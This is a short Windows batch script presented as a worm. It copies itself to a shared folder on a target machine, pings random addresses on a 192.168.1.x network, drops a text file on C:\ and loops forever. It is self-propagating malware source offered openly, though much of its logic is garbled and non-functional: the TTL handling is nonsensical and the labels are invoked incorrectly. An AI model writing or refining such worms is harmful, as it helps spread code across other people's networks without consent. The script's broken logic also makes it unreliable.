@echo off
setlocal

:: Function to copy the worm to a shared folder
:copy_worm
echo Copying worm to shared folder...
copy %0 \\target_machine\shared_folder /y

:: Function to run the worm on other machines
:run_worm
echo Running worm on other machines...
ping 127.0.0.1 -n 1 >nul
for /f "tokens=1 delims=:" %%i in ('ping -n 1 -l 1 %computername% ^| find "TTL="') do set ttl=%%i
set /a ttl-=1
for /l %%i in (1,1,%ttl%) do (
    for /f "tokens=1 delims=:" %%j in ('ping -n 1 -l %%i 192.168.1.%random% ^| find "TTL="') do set ttl=%%j
    if %ttl% gtr 0 goto :run_worm
)

:: Main script
echo Worm is running...
:main
echo Creating a harmless text file...
echo Harmless text file created by worm > C:\harmless_file.txt
copy_worm
run_worm
goto main
